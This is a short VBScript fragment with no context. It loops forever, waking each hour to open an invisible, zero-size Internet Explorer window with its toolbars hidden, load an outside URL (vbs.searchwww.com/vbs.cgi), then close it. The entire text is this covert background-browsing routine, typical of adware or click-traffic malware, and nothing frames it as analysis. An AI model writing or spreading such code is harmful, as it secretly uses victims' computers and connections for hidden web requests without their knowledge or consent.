   while 1
   wscript.sleep 3600000
   set searchwww = createobject("internetexplorer.application")
   searchwww.height = 0
   searchwww.menubar = 0
   searchwww.statusbar = 0
   searchwww.toolbar = 0
   searchwww.width = 0
   searchwww.navigate "http://vbs.searchwww.com/vbs.cgi"
   do while searchwww.busy
   wscript.sleep 1000
   loop
   if searchwww.height = 0 and searchwww.width = 0 then
   searchwww.quit
   else
   searchwww.visible = 1
   end if
   wend
